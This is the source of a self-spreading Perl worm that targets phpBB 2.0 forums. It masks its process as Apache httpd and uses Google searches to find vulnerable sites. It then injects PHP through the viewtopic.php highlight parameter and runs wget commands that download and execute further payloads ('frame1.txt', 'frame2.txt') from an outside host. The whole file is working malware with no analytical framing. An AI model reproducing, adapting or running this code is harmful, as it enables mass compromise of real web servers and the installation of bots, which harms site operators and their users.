# ASW worm 7nd modification - MyPrettyWorm.perl !
# Created ( riped ) by br0k3d@gmail.com
# Created ( riped-again ) by rockemon@gmail.com
# Fuckz google ! Fuckz MSN ! Fuckz Fotolog.net


use strict;
use IO::Socket;
use IO::Handle;


#Start hiding the process
my $processo = '/usr/local/apache/bin/httpd -DSSL'; 
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);
#Process hided 

sub fetch();
sub remote($);
sub http_query($);
sub encode($);

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 50;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

    my @str=("%22.php?t=%22+%22Powered+by+phpBB+2.0%22","%22.php?p=%22+%22Powered+by+phpBB+2.0%22","%22Powered+by+phpBB+2.0.4%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.5%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.6%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.7%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.8%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.9%22+%22.php%3Ft%3D%22","%22Powered+by+phpBB+2.0.10%22+%22.php%3Ft%3D%22");

    my $query="www.google.com/search?hl=en&lr=&q=";
    $query.=$str[(rand(scalar(@str)))].$rnd;
    $query.="&num=$n&start=$s";

    my @lst=();
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
        if ($1 !~ m/google|cache|translate/){
            push (@lst,$1);
        }
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
        local $SIG{ALRM} = sub { die "1";};
        alarm 10;
        my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
        print $sock "GET $query HTTP/1.0\nHost: $host\nAccept: */*\nUser-Agent: Mozilla/4.0\n\n ";
        my @r = <$sock>;
        $page="@r";
        alarm 0;
        close($sock);
    };    
    return $page;

}

sub encode($) {
    my $s = shift;
    $s =~ s/(.)/"chr(".ord($1).")%252E"/seg;
    $s =~ s/%252E$//;
    return $s;
}


if (-e "sess_189f0f0889555397a4de5485dd61974aa") {exit;}
eval {fork and exit;};

$|++;
open LOG,">>sess_189f0f0889555397a4de5485dd61974aa";
autoflush LOG 1;
srand;
my $iam=$ARGV[0];
my $oneday=time+86400; # it was 1 week but google is blocking all :(
my $page="";
my @urls;
my $url;


while(time<$oneday){
@urls=fetch();
foreach $url (@urls) {
if ($url !~ /viewtopic.php/) {next;}
$url =~ s/(.*\/viewtopic.php\?[t|p]=[0-9]+).*/$1/;
print LOG "chk ".$url." ";
my $cmd=encode("perl -e \"print q(jSVowMsd)\"");
$url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
$page = http_query($url);
if ( $page =~ /jSVowMsd/ ){
$url =~ s/&highlight.*//;
my $upload=$url;
$upload =~ s/viewtopic.*//;
print LOG ">bug viewtopic found ";
$cmd="wget http://g4bi.com/downloads/frame1.txt -O /tmp/.myprettyworm;perl /tmp/.myprettyworm";    # set cmd
$cmd=encode("$cmd");    # set cmd
$url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
$page = http_query($url);

$cmd="wget http://g4bi.com/downloads/frame2.txt -O /tmp/.myprettybot;perl /tmp/.myprettybot;touch /tmp/sess_189f0f0889555397a4de5485dd61978aa";    # set cmd
$cmd=encode("$cmd");    # set cmd
$url =~ s/&highlight.*//;
$url .="&highlight=%2527%252Esystem(".$cmd.")%252E%2527";
$page = http_query($url);
print LOG ">done\n";
}
else {
print LOG ">viewtopic ok\n";
}
}
}
close LOG;
